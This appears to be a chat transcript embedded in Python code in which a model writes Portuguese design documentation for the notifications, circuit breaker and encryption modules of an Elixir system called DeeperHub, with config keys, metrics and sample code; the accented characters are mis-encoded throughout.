*   **`[:notifications, :channels, :email, :adapter]`** (Module): Adaptador para envio de email (ex: `DeeperHub.Mailer`).
*   **`[:notifications, :channels, :email, :from_address]`** (String).
*   **`[:notifications, :channels, :push, :fcm_api_key]`** (String).
*   **`[:notifications, :channels, :sms, :provider_api_key]`** (String).
*   **`[:notifications, :templates, :base_path]`** (String): Caminho para os arquivos de template.
*   **`[:notifications, :templates, :cache_ttl_seconds]`** (Integer).
*   **`[:notifications, :preferences_cache, :ttl_seconds]`** (Integer).
*   **`[:notifications, :scheduler, :check_interval_seconds]`** (Integer).
*   **`[:notifications, :retention, :history_days]`** (Integer): Por quantos dias manter o hist√≥rico de notifica√ß√µes.
*   **`[:notifications, :retention, :scheduled_cleanup_days]`** (Integer): Por quantos dias manter scheduled notifications antigas.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`, `Core.Cache`, `Core.BackgroundTaskManager`.
*   `DeeperHub.Mailer`: Para o canal de email.
*   `DeeperHub.Accounts`: Para obter informa√ß√µes do usu√°rio (email, device tokens para push).
*   `DeeperHub.Audit` (via `Integrations.AuditIntegration`).

### 8.2. Bibliotecas Externas

*   Bibliotecas de template (EEx √© nativo, mas outras como `NimblePublisher` para markdown podem ser usadas).
*   Bibliotecas cliente para servi√ßos de Push (FCM, APNS) ou SMS, se usados.
*   `Jason` para payloads de push.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Disparar Notifica√ß√µes a Partir de Eventos:** Criar listeners do `Core.EventBus` que chamam `Notifications.send_notification`.
    ```elixir
    # Em um m√≥dulo listener
    def handle_event(\"user.password_reset_requested\", %{user_id: user_id, reset_token: token}, _metadata) do
      DeeperHub.Notifications.send_notification(
        user_id, 
        :password_reset_instruction, 
        %{reset_link: \"https://.../#{token}\"}
      )
    end
    ```
*   **Envio Direto de Servi√ßos:**
    ```elixir
    # Em DeeperHub.Support.TicketService
    def assign_ticket_to_agent(ticket_id, agent_id) do
      # ... l√≥gica ...
      DeeperHub.Notifications.send_notification(
        agent_id, 
        :ticket_assigned_to_you, 
        %{ticket_id: ticket_id, ticket_subject: ticket.subject}
      )
      # ...
    end
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o envio de notifica√ß√µes para cada canal (com mocks para servi√ßos externos).
*   Testar a l√≥gica de prefer√™ncias do usu√°rio (usu√°rio recebe/n√£o recebe conforme configurado).
*   Testar a renderiza√ß√£o de templates com diferentes dados e locales.
*   Testar o agendamento e cancelamento de notifica√ß√µes.
*   Testar a marca√ß√£o de \"lida\" para notifica√ß√µes in-app.
*   Testar os workers de envio e limpeza.
*   Localiza√ß√£o: `test/deeper_hub/notifications/`.

### 10.2. M√©tricas

*   `deeper_hub.notifications.sent.count` (tags: `channel`, `notification_type`, `status` (`success`, `failed`))
*   `deeper_hub.notifications.delivery.duration_ms` (Histograma, tags: `channel`)
*   `deeper_hub.notifications.scheduled.enqueued.count`
*   `deeper_hub.notifications.in_app.read.count`
*   `deeper_hub.notifications.preferences.updated.count`
*   `deeper_hub.notifications.template.render.duration_ms` (Histograma, tags: `template_name`)

### 10.3. Logs

*   **N√≠vel INFO:** Notifica√ß√£o enfileirada, enviada com sucesso, agendada. Prefer√™ncias atualizadas.
*   **N√≠vel WARNING:** Falha tempor√°ria no envio para um canal (com retentativa). Template n√£o encontrado.
*   **N√≠vel ERROR:** Falha persistente no envio para um canal. Erro ao renderizar template. Erro cr√≠tico no servi√ßo de notifica√ß√µes.

### 10.4. Telemetria

*   `[:deeper_hub, :notifications, :dispatch, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, notification_type: type, channels: list}`
*   `[:deeper_hub, :notifications, :delivery_attempt, :start | :stop | :exception]`
    *   Metadados: `%{notification_id: id, channel: channel, attempt: num}`
    *   No `:stop`: `%{status: :success | :failure, error_reason: reason_if_any}`
*   `[:deeper_hub, :notifications, :preference, :queried | :updated]`
    *   Metadados: `%{user_id: id}`

## ‚ùå 11. Tratamento de Erros

*   **Falha no Canal de Entrega:** Se um canal (ex: servidor SMTP) estiver indispon√≠vel, o worker correspondente deve registrar o erro e tentar novamente conforme a pol√≠tica de retry. Falhas em um canal n√£o devem impedir o envio por outros canais para a mesma notifica√ß√£o.
*   **Usu√°rio Sem Prefer√™ncias ou Informa√ß√µes de Contato:** O sistema deve lidar graciosamente (ex: n√£o enviar, logar aviso) se n√£o houver como contatar o usu√°rio por um canal selecionado.
*   **Template Inv√°lido/Ausente:** Logar erro e possivelmente enviar uma notifica√ß√£o gen√©rica/padr√£o, ou n√£o enviar por aquele canal.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Conte√∫do das Notifica√ß√µes:** Dados sens√≠veis n√£o devem ser inclu√≠dos diretamente no corpo de emails ou pushes, a menos que seja estritamente necess√°rio e o canal seja seguro. √â prefer√≠vel linkar para a aplica√ß√£o (onde o usu√°rio est√° autenticado) para ver detalhes.
*   **Phishing:** Emails e SMSs de notifica√ß√£o devem ter uma apar√™ncia consistente e identific√°vel para evitar que os usu√°rios cliquem em links de phishing. Incluir informa√ß√µes que s√≥ o sistema e o usu√°rio saberiam (com modera√ß√£o).
*   **Privacidade:** Respeitar as prefer√™ncias do usu√°rio √© fundamental. N√£o enviar notifica√ß√µes que o usu√°rio desabilitou.
*   **Rate Limiting (para o sistema):** O pr√≥prio sistema de notifica√ß√µes pode ser um alvo se puder ser usado para spam. Limitar a frequ√™ncia de certos tipos de notifica√ß√µes (ex: notifica√ß√µes de seguran√ßa repetidas).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Crie novos templates em `templates/<channel>/<notification_type>.<format>.eex`.
*   Adicione tradu√ß√µes em `templates/i18n/`.
*   Ao definir um novo `notification_type`, configure seus canais padr√£o e adicione op√ß√µes nas prefer√™ncias do usu√°rio.
*   Use `content_data` para passar todas as vari√°veis necess√°rias para o template, evitando l√≥gica complexa dentro dos templates.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um painel para usu√°rios gerenciarem visualmente seus hist√≥ricos de notifica√ß√£o e prefer√™ncias de forma mais granular.
*   [ ] Adicionar suporte a notifica√ß√µes Web Push para navegadores desktop/mobile.
*   [ ] Permitir que usu√°rios \"silenciem\" notifica√ß√µes por um per√≠odo.
*   [ ] Agrega√ß√£o de notifica√ß√µes similares para evitar sobrecarregar o usu√°rio (ex: \"Voc√™ tem 3 novas mensagens\" em vez de 3 pushes separados).
*   [ ] Testes A/B para o conte√∫do e timing de notifica√ß√µes para otimizar o engajamento.
*   [ ] Integra√ß√£o com um servi√ßo de an√°lise para rastrear taxas de abertura/clique (para email, push).
*   [ ] Canal de Slack ou Discord para notifica√ß√µes para administradores ou equipes internas.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

O sistema de notifica√ß√µes √© um componente complexo e muito importante para a experi√™ncia do usu√°rio e para a opera√ß√£o do sistema.

Agora, para onde vamos? Podemos detalhar os subm√≥dulos do `DeeperHub.Notifications` como o `TemplateManager` ou o `Scheduler`, ou mudar para outro m√≥dulo Core, como `DeeperHub.Core.CircuitBreakerFactory` ou `DeeperHub.Core.EncryptionService`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok! Dado que o `DeeperHub.Core.CircuitBreakerFactory` (ou apenas `CircuitBreaker`) foi mencionado como uma depend√™ncia para intera√ß√µes com servi√ßos externos (como GeoIP, SMTP, e potencialmente o pr√≥prio `DeeperHub.Notifications` se ele usar provedores externos de push/SMS), vamos detalh√°-lo agora. Ele √© crucial para a resili√™ncia do sistema.

---

# M√≥dulo: `DeeperHub.Core.CircuitBreaker` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.CircuitBreaker`

O m√≥dulo `DeeperHub.Core.CircuitBreaker` implementa o padr√£o de design **Circuit Breaker**. Seu objetivo √© aumentar a resili√™ncia e a estabilidade do sistema DeeperHub ao interagir com servi√ßos externos ou recursos internos que podem apresentar falhas ou lat√™ncia.

Quando um servi√ßo protegido por um circuit breaker come√ßa a falhar repetidamente, o circuito \"abre\", fazendo com que as chamadas subsequentes para esse servi√ßo falhem imediatamente (ou retornem um fallback) por um per√≠odo, sem tentar realmente contatar o servi√ßo problem√°tico. Isso previne que a aplica√ß√£o fique presa esperando por um servi√ßo que n√£o responde, evita o esgotamento de recursos (como threads ou conex√µes) e d√° tempo para o servi√ßo problem√°tico se recuperar. Ap√≥s um timeout, o circuito entra no estado \"meio-aberto\", permitindo um n√∫mero limitado de chamadas de teste. Se bem-sucedidas, o circuito \"fecha\" e o tr√°fego normal √© restaurado. Caso contr√°rio, ele volta para o estado \"aberto\". üòä

*(Nota: A documenta√ß√£o original tem `DeeperHub.Shared.CircuitBreaker`, `CircuitBreakerFacade`, `Registry`, `Config`. Esta documenta√ß√£o consolida a funcionalidade principal sob `DeeperHub.Core.CircuitBreaker`, que pode atuar como fachada e orquestrador para inst√¢ncias de circuit breakers gerenciadas talvez por um `Registry` interno ou pela biblioteca escolhida).*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Prote√ß√£o de Chamadas a Servi√ßos:**
    *   Envolver chamadas a servi√ßos (internos ou externos) com a l√≥gica do circuit breaker (`run/4` ou `call/3`).
*   **Gerenciamento de Estados do Circuito:**
    *   Manter o estado de cada circuit breaker individualmente:
        *   **Fechado (`:closed`):** Opera√ß√£o normal, chamadas s√£o permitidas. Falhas s√£o contadas.
        *   **Aberto (`:open`):** Falhas excederam o limiar. Chamadas falham imediatamente (ou usam fallback) por um per√≠odo de `reset_timeout`.
        *   **Meio-Aberto (`:half_open`):** Ap√≥s o `reset_timeout`, permite um n√∫mero limitado de chamadas de teste. Se bem-sucedidas, volta para `:closed`. Se falharem, volta para `:open`.
*   **Contagem de Falhas e Sucessos:**
    *   Rastrear o n√∫mero de falhas e sucessos consecutivos (ou dentro de uma janela de tempo) para cada servi√ßo protegido.
*   **Limiares Configur√°veis:**
    *   `failure_threshold`: N√∫mero de falhas para abrir o circuito.
    *   `success_threshold`: N√∫mero de sucessos em estado meio-aberto para fechar o circuito.
    *   `reset_timeout_ms`: Tempo que o circuito permanece aberto antes de tentar o estado meio-aberto.
    *   `call_timeout_ms` (opcional): Timeout para a chamada ao servi√ßo protegido em si.
*   **Suporte a Fallback:**
    *   Permitir a execu√ß√£o de uma fun√ß√£o de fallback quando o circuito est√° aberto ou a chamada principal falha.
*   **Registro e Gerenciamento de Inst√¢ncias de Circuit Breaker:**
    *   Permitir a cria√ß√£o e configura√ß√£o din√¢mica de m√∫ltiplos circuit breakers, cada um nomeado e associado a um servi√ßo espec√≠fico (`register/2`).
    *   Consultar o estado e configura√ß√£o de circuit breakers (`state/1`, `list_all/0`).
    *   Resetar manualmente um circuit breaker (`reset/1`).
*   **Observabilidade:**
    *   Emitir eventos e m√©tricas sobre mudan√ßas de estado do circuito, chamadas permitidas/bloqueadas, falhas, sucessos.
    *   Logar transi√ß√µes de estado e erros significativos.
*   **Persist√™ncia de Estado (Opcional, Avan√ßado):**
    *   Para ambientes distribu√≠dos ou para manter o estado entre rein√≠cios, o estado dos circuit breakers (especialmente o estado `:open` e `reset_timeout`) poderia ser persistido (ex: Redis). Por padr√£o, o estado √© geralmente em mem√≥ria por processo/ETS.

## üèóÔ∏è 3. Arquitetura e Design

Existem v√°rias maneiras de implementar Circuit Breakers em Elixir:
1.  **Usando uma biblioteca existente:** Como `Fuse`, `Breaker`, ou `CircuitBreaker.Ex`. Estas geralmente fornecem GenServers para gerenciar o estado de cada breaker.
2.  **Implementa√ß√£o customizada com GenServers:** Um GenServer por servi√ßo protegido para manter seu estado.
3.  **Implementa√ß√£o com ETS:** Para alta performance, o estado pode ser mantido em ETS com atualiza√ß√µes at√¥micas.

Assumindo o uso de uma abordagem baseada em GenServer (seja de uma biblioteca ou customizada) gerenciada por um Registry:

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.CircuitBreaker` (Fachada P√∫blica):**
    *   Ponto de entrada para registrar, executar chamadas e gerenciar circuit breakers.
    *   Delega para o `CircuitBreaker.Registry` ou diretamente para a biblioteca de circuit breaker configurada.
2.  **`DeeperHub.Core.CircuitBreaker.Registry` (GenServer):**
    *   **Responsabilidade:** Gerenciar e supervisionar as inst√¢ncias de GenServers de circuit breakers individuais.
    *   Mant√©m um mapa de `service_name` para `pid_do_breaker_genserver`.
    *   Lida com o registro (`register/2`) e consulta (`state/1`) de breakers.
3.  **`DeeperHub.Core.CircuitBreaker.Instance` (GenServer - um por servi√ßo protegido):**
    *   **Responsabilidade:** Implementa a l√≥gica de m√°quina de estados do circuit breaker para um servi√ßo espec√≠fico.
    *   **Estado Interno:** `:state` (`:closed`, `:open`, `:half_open`), `failure_count`, `success_count`, `last_failure_timestamp`, `config` (limiares, timeouts).
    *   **Intera√ß√µes:** Recebe solicita√ß√µes de execu√ß√£o (`run/4`), atualiza seu estado com base no sucesso/falha da chamada ao servi√ßo real.
4.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager`):**
    *   Configura√ß√µes padr√£o para novos circuit breakers.
    *   Configura√ß√µes espec√≠ficas por `service_name`.
5.  **M√≥dulos que usam o Circuit Breaker:**
    *   Qualquer m√≥dulo que fa√ßa chamadas a servi√ßos externos ou internos que podem falhar (ex: `GeoLocationService.Adapters`, `Mailer.Adapters`, `OAuth.Integrations.OAuthApiIntegration`).

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/core/circuit_breaker/
‚îú‚îÄ‚îÄ circuit_breaker.ex              # Fachada P√∫blica
‚îú‚îÄ‚îÄ registry.ex                     # GenServer para gerenciar inst√¢ncias de CB
‚îú‚îÄ‚îÄ instance.ex                     # GenServer que implementa a l√≥gica de um CB
‚îú‚îÄ‚îÄ config.ex                       # (Opcional) M√≥dulo para carregar/gerenciar configs de CBs
‚îî‚îÄ‚îÄ supervisor.ex                   # Supervisor para o Registry e, indiretamente, as Inst√¢ncias
```
Se uma biblioteca externa for usada, a estrutura pode ser mais simples, com `circuit_breaker.ex` atuando como um wrapper/fachada para a API da biblioteca.

### 3.3. Decis√µes de Design Importantes

*   **Nomea√ß√£o de Circuit Breakers:** Cada servi√ßo ou recurso protegido deve ter um nome √∫nico para seu circuit breaker.
*   **Configura√ß√£o por Inst√¢ncia:** Cada circuit breaker deve poder ter seus pr√≥prios limiares e timeouts, com padr√µes globais.
*   **Transpar√™ncia para o Chamador:** A fun√ß√£o `run/4` (ou `call/3`) deve abstrair a l√≥gica do circuit breaker. O chamador apenas fornece a fun√ß√£o a ser executada e, opcionalmente, um fallback.
*   **Notifica√ß√£o de Mudan√ßa de Estado:** √â √∫til emitir eventos ou logs quando um circuito abre ou fecha, para monitoramento.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Chamada a uma API de GeoIP Externa:**
    *   `GeoLocationService` precisa buscar dados de um IP.
    *   `CircuitBreaker.run(:geoip_service, fn -> HTTPClient.get(url) end, fn -> {:ok, fallback_data} end, call_timeout_ms: 2000)`.
    *   Se a API GeoIP estiver lenta ou offline, ap√≥s algumas falhas, o circuito para `:geoip_service` abre. Chamadas subsequentes usam `fallback_data` imediatamente.
*   **Envio de Email via SMTP Externo:**
    *   `Mailer` tenta enviar um email.
    *   `CircuitBreaker.run(:smtp_service, fn -> SMTPClient.send(email) end)`.
    *   Se o servidor SMTP estiver inacess√≠vel, o circuito abre, e o `Mailer` pode enfileirar o email para tentativa posterior.
*   **Acesso a um Microservi√ßo Interno:**
    *   `OrderService` precisa chamar `InventoryService`.
    *   `CircuitBreaker.run(:inventory_service, fn -> InventoryClient.check_stock(item_id) end)`.
    *   Se o `InventoryService` estiver sobrecarregado, o circuito protege o `OrderService` de ficar esperando.

## üåä 5. Fluxos Importantes

### Fluxo de Execu√ß√£o de uma Chamada Protegida (`run/4`)

1.  **Chamador:** `CircuitBreaker.run(:my_api, do_api_call_fun, fallback_fun, opts)`.
2.  **`CircuitBreaker` (Fachada):**
    *   Localiza o PID do `CircuitBreaker.Instance` para `:my_api` atrav√©s do `Registry`.
    *   Se n√£o existir, pode tentar registrar um novo com configura√ß√µes padr√£o/espec√≠ficas ou retornar erro.
    *   Encaminha a solicita√ß√£o para o `CircuitBreaker.Instance` PID.
3.  **`CircuitBreaker.Instance` (GenServer para `:my_api`):**
    *   **Verifica Estado:**
        *   **Se `:open`:**
            *   Verifica se `reset_timeout` passou.
                *   Se sim, muda para `:half_open`, reseta `success_count`, e permite a chamada.
                *   Se n√£o, executa `fallback_fun` (se fornecida) ou retorna `{:error, :circuit_open}`. Incrementa m√©trica `calls_short_circuited`.
        *   **Se `:half_open`:**
            *   Verifica se o n√∫mero de chamadas de teste permitidas (`half_open_calls`) foi excedido.
                *   Se sim, executa `fallback_fun` ou retorna `{:error, :circuit_open}` (ainda est√° testando).
                *   Se n√£o, permite a chamada.
        *   **Se `:closed`:** Permite a chamada.
    *   **Executa `do_api_call_fun` (se permitido):**
        *   Pode aplicar um `call_timeout_ms` espec√≠fico.
        *   **Sucesso (`{:ok, result}`):**
            *   Se estado era `:half_open`, incrementa `success_count`. Se `success_count >= success_threshold`, muda para `:closed`, reseta contadores.
            *   Se estado era `:closed`, reseta `failure_count`.
            *   Incrementa m√©trica `calls_succeeded`.
            *   Retorna `{:ok, result}`.
        *   **Falha (`{:error, reason}` ou exce√ß√£o):**
            *   Incrementa m√©trica `calls_failed`.
            *   Se estado era `:half_open`, muda para `:open`, agenda pr√≥ximo `reset_timeout`.
            *   Se estado era `:closed`, incrementa `failure_count`. Se `failure_count >= failure_threshold`, muda para `:open`, agenda `reset_timeout`.
            *   Executa `fallback_fun` (se fornecida) ou retorna `{:error, reason_da_chamada_original}`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Core.CircuitBreaker`)

*(Baseado na documenta√ß√£o original e consolidando)*

### 6.1. `DeeperHub.Core.CircuitBreaker.run(service_name :: atom(), func :: (() -> {:ok, term()} | {:error, term()}), fallback_func :: (() -> {:ok, term()} | {:error, term()}) | nil, opts :: keyword()) :: {:ok, term()} | {:error, :circuit_open | term()}`

*   **Descri√ß√£o:** Executa `func` protegida pelo circuit breaker nomeado `service_name`. Se o circuito estiver aberto ou `func` falhar e um `fallback_func` for fornecido, o resultado do fallback √© retornado.
*   **`opts`:**
    *   `:call_timeout_ms` (integer): Timeout para a execu√ß√£o de `func`.
    *   Outras op√ß√µes podem ser passadas para a l√≥gica de registro/configura√ß√£o do breaker se ele n√£o existir.
*   **Retorno:** `{:ok, result_de_func_ou_fallback}` ou `{:error, :circuit_open}` (se sem fallback e aberto) ou `{:error, reason_de_func_ou_fallback}`.

### 6.2. `DeeperHub.Core.CircuitBreaker.register(service_name :: atom(), config :: map()) :: :ok | {:error, :already_registered | term()}`

*   **Descri√ß√£o:** Registra e configura um novo circuit breaker.
*   **`config`:** Mapa com limiares e timeouts (ex: `%{failure_threshold: 5, reset_timeout_ms: 30000, success_threshold: 2, call_timeout_ms: 5000, half_open_calls: 3}`).

### 6.3. `DeeperHub.Core.CircuitBreaker.state(service_name :: atom()) :: {:ok, :closed | :open | :half_open} | {:error, :not_found}`

*   **Descri√ß√£o:** Retorna o estado atual do circuit breaker especificado.

### 6.4. `DeeperHub.Core.CircuitBreaker.reset(service_name :: atom()) :: :ok | {:error, :not_found}`

*   **Descri√ß√£o:** For√ßa o circuit breaker especificado para o estado `:closed`.

### 6.5. `DeeperHub.Core.CircuitBreaker.list_all() :: {:ok, list(%{name: atom(), state: atom(), config: map(), stats: map()})}`

*   **Descri√ß√£o:** Lista todos os circuit breakers registrados, seus estados, configura√ß√µes e estat√≠sticas (contagem de falhas/sucessos recentes).

### 6.6. `DeeperHub.Core.CircuitBreaker.update_config(service_name :: atom(), new_config :: map()) :: :ok | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Atualiza a configura√ß√£o de um circuit breaker existente em tempo de execu√ß√£o.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :circuit_breaker, :enabled]`** (Boolean): Habilita/desabilita o sistema de Circuit Breaker globalmente. (Padr√£o: `true`)
*   **`[:core, :circuit_breaker, :default_config]`** (Map): Configura√ß√µes padr√£o para novos circuit breakers.
    *   Ex: `%{failure_threshold: 5, reset_timeout_ms: 30000, success_threshold: 2, call_timeout_ms: 5000, half_open_calls: 3}`
*   **`[:core, :circuit_breaker, :services, <service_name>]`** (Map): Configura√ß√µes espec√≠ficas para um `service_name`. Estas sobrescrevem os padr√µes.
    *   Ex: `%{geoip_api: %{failure_threshold: 3, reset_timeout_ms: 60000}}`
*   **`[:core, :circuit_breaker, :storage_adapter]`** (Module, opcional): Se o estado dos breakers precisar ser persistido (ex: `MyApp.CircuitBreaker.RedisStorage`). (Padr√£o: estado em mem√≥ria via GenServer/ETS).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
*   `DeeperHub.Core.Logger`: Para logar transi√ß√µes de estado e erros.
*   `DeeperHub.Core.Metrics`: Para m√©tricas de circuit breaker.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar o `Registry` e as `Instance`s.

### 8.2. Bibliotecas Externas

*   Opcionalmente, uma biblioteca de Circuit Breaker como `Fuse` ou `Breaker`. Se n√£o, a l√≥gica √© implementada internamente com GenServers/ETS.

## ü§ù 9. Como Usar / Integra√ß√£o

M√≥dulos que fazem chamadas a servi√ßos externos ou internos que podem ser inst√°veis devem envolver essas chamadas com `CircuitBreaker.run/4`.

**Exemplo em um adaptador de servi√ßo externo:**
```elixir
defmodule MyApp.ExternalGeoServiceAdapter do
  alias DeeperHub.Core.CircuitBreaker
  alias DeeperHub.Core.HTTPClient # Assumindo um HTTPClient

  @service_name :external_geo_service

  def init_breaker do
    # Config pode vir do ConfigManager
    config = %{failure_threshold: 3, reset_timeout_ms: 60000, call_timeout_ms: 2000}
    CircuitBreaker.register(@service_name, config)
  end

  def get_location_for_ip(ip_address) do
    api_call_fun = fn ->
      case HTTPClient.get(\"https://geo.example.com/ip/#{ip_address}\", timeout: 1800) do
        {:ok, %{status_code: 200, body: body_map}} -> {:ok, body_map}
        {:ok, %{status_code: _other_status}} -> {:error, :api_error}
        {:error, reason} -> {:error, reason}
      end
    end

    fallback_fun = fn ->
      # Tentar uma base de dados local ou retornar dados padr√£o
      {:ok, %{country: \"Unknown\", city: \"Unknown\"}} 
    end

    CircuitBreaker.run(@service_name, api_call_fun, fallback_fun)
  end
end
```
A chamada `init_breaker` seria feita uma vez na inicializa√ß√£o do m√≥dulo ou da aplica√ß√£o.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a transi√ß√£o de estados do circuit breaker (`closed` -> `open` -> `half_open` -> `closed` e `half_open` -> `open`).
*   Testar o comportamento com e sem fun√ß√£o de fallback.
*   Testar o `call_timeout_ms`.
*   Testar o `reset_timeout_ms`.
*   Testar o registro e atualiza√ß√£o de configura√ß√£o de breakers.
*   Localiza√ß√£o: `test/deeper_hub/core/circuit_breaker/`.

### 10.2. M√©tricas

*   `deeper_hub.core.circuit_breaker.calls.total` (tags: `service_name`, `status` (`success`, `failure`, `timeout`, `short_circuited`))
*   `deeper_hub.core.circuit_breaker.state_transitions.count` (tags: `service_name`, `from_state`, `to_state`)
*   `deeper_hub.core.circuit_breaker.state.current` (Gauge, tags: `service_name`, valor: 0=:closed, 1=:open, 2=:half_open)
*   `deeper_hub.core.circuit_breaker.fallback.used.count` (tags: `service_name`)
*   `deeper_hub.core.circuit_breaker.call.duration_ms` (Histograma, tags: `service_name`, `was_successful`)

### 10.3. Logs

*   **N√≠vel INFO:** Transi√ß√£o de estado de um circuit breaker (ex: \"Circuit breaker para :my_service ABERTO\"). Sucesso em estado `half_open` levando a fechamento.
*   **N√≠vel WARNING:** Chamada falhou e contribuiu para abrir o circuito. Chamada short-circuitada porque o circuito est√° aberto.
*   **N√≠vel ERROR:** Erro interno no pr√≥prio GenServer do Circuit Breaker.

### 10.4. Telemetria

*   `[:deeper_hub, :core, :circuit_breaker, :call, :start | :stop | :exception]`
    *   Metadados: `%{service_name: name, initial_state: state}`
    *   No `:stop`: `%{result: :success | :failure | :timeout | :short_circuited, final_state: state, fallback_used: boolean}`
*   `[:deeper_hub, :core, :circuit_breaker, :state_changed]`
    *   Metadados: `%{service_name: name, old_state: state, new_state: state, reason: :failure_threshold_reached | :reset_timeout | :success_threshold_reached}`

## ‚ùå 11. Tratamento de Erros

*   A fun√ß√£o `run/4` retorna `{:error, :circuit_open}` se o circuito estiver aberto e nenhum fallback for fornecido, ou o erro da fun√ß√£o original/fallback.
*   Erros na configura√ß√£o ou registro de um breaker devem ser logados e impedir o uso desse breaker espec√≠fico, mas n√£o devem derrubar o `Registry`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   A exposi√ß√£o do estado dos circuit breakers (`list_all/0`, `state/1`) via uma API administrativa deve ser protegida, pois pode revelar informa√ß√µes sobre a sa√∫de de depend√™ncias internas ou externas.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar uma nova integra√ß√£o com servi√ßo externo, considere proteg√™-la com um circuit breaker.
*   Ajuste os limiares e timeouts com base no comportamento esperado e na criticidade do servi√ßo protegido.
*   Forne√ßa fun√ß√µes de fallback sensatas sempre que poss√≠vel.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar \"bulkheads\" (isolamento de recursos por servi√ßo) em conjunto com circuit breakers para limitar o impacto de um servi√ßo lento no pool de workers da aplica√ß√£o.
*   [ ] Implementar estrat√©gias de retry com backoff *antes* de declarar uma falha para o circuit breaker, para lidar com falhas transit√≥rias de rede.
*   [ ] Permitir que as configura√ß√µes do circuit breaker (limiares, timeouts) sejam atualizadas dinamicamente em tempo de execu√ß√£o sem reiniciar o breaker (al√©m do `update_config` j√° proposto, garantir que seja aplicado ao processo em execu√ß√£o).
*   [ ] Interface de UI para visualizar o estado de todos os circuit breakers e reset√°-los manualmente.
*   [ ] Considerar a persist√™ncia do estado `:open` e do `reset_timeout` em um armazenamento como Redis para que o estado sobreviva a rein√≠cios da aplica√ß√£o, evitando que um servi√ßo problem√°tico seja imediatamente sobrecarregado ap√≥s um deploy.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Circuit breakers s√£o uma ferramenta poderosa para construir sistemas resilientes!

Onde vamos agora? Talvez `DeeperHub.Core.EncryptionService` para cobrir criptografia e gerenciamento de chaves, ou algum dos utilit√°rios de `Shared.Utils` como `MapUtils` ou `ListUtils`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Excelente! Vamos ent√£o detalhar o `DeeperHub.Core.EncryptionService`. Este m√≥dulo √© fundamental para proteger dados sens√≠veis em repouso e, potencialmente, em tr√¢nsito dentro de certos contextos.

---

# M√≥dulo: `DeeperHub.Core.EncryptionService` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.EncryptionService`

O m√≥dulo `DeeperHub.Core.EncryptionService` √© o componente centralizado para todas as **opera√ß√µes de criptografia e descriptografia de dados sens√≠veis** no sistema DeeperHub. Ele tamb√©m √© respons√°vel pelo **gerenciamento seguro do ciclo de vida das chaves de criptografia**, incluindo gera√ß√£o, armazenamento, rota√ß√£o e revoga√ß√£o.

O objetivo principal √© garantir a confidencialidade de informa√ß√µes como dados pessoais de usu√°rios (PII), credenciais de acesso a servi√ßos externos, tokens internos e quaisquer outros dados que requeiram prote√ß√£o contra acesso n√£o autorizado, tanto em repouso (armazenados em banco de dados ou arquivos) quanto, em alguns casos, em tr√¢nsito (entre componentes internos, se necess√°rio). üòä

*(Nota: A documenta√ß√£o original tem `DeeperHub.Shared.Encryption` com subm√≥dulos como `AtRestEncryptionService`, `KeyManagementService`, `EncryptedType`. Esta documenta√ß√£o consolida a fachada principal em `DeeperHub.Core.EncryptionService` e assume que a l√≥gica especializada residiria em subm√≥dulos ou servi√ßos dentro de um contexto `DeeperHub.Encryption` ou `DeeperHub.Shared.Encryption`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Criptografia de Dados (`encrypt/2`, `encrypt_for_storage/2`):**
    *   Fornecer uma API para criptografar dados arbitr√°rios usando algoritmos fortes e chaves gerenciadas.
    *   Suportar criptografia sim√©trica (ex: AES-256-GCM).
    *   Incluir metadados na sa√≠da criptografada (ex: ID da chave usada, IV/nonce, tag de autentica√ß√£o) para permitir a descriptografia correta e a rota√ß√£o de chaves.
    *   Diferenciar entre criptografia gen√©rica e criptografia para armazenamento \"at-rest\" (que pode ter contextos ou prefixos espec√≠ficos).
*   **Descriptografia de Dados (`decrypt/2`, `decrypt_from_storage/2`):**
    *   Descriptografar dados previamente criptografados usando a chave correta identificada pelos metadados.
    *   Verificar a integridade e autenticidade dos dados usando a tag de autentica√ß√£o (para modos como GCM).
*   **Gerenciamento de Chaves de Criptografia (via `KeyManagementService`):**
    *   **Gera√ß√£o de Chaves (`generate_key/1`):** Gerar chaves criptogr√°ficas fortes de forma segura.
    *   **Armazenamento Seguro de Chaves:** Armazenar chaves de forma segura, idealmente usando um Hardware Security Module (HSM), um Key Management Service (KMS) de nuvem (AWS KMS, Google Cloud KMS, Azure Key Vault), ou, no m√≠nimo, com uma chave mestra que criptografa as chaves de dados. (A implementa√ß√£o inicial pode usar um arquivo protegido ou vari√°veis de ambiente para a chave mestra).
